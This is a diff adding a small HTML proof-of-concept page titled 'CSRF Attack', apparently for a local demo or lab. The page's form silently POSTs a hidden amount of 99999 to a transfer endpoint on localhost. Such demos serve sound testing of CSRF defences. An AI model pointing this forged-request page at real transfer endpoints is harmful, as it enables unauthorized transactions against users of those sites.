@@ -1,0 +1,13 @@
+
+<!DOCTYPE html>
+<html>
+<body>
+<h2>CSRF Attack</h2>
+
+<form action="http://localhost:8080/transfer" method="POST">
+  <input type="hidden" name="amount" value="99999"/>
+  <button>Attack</button>
+</form>
+
+</body>
+</html>
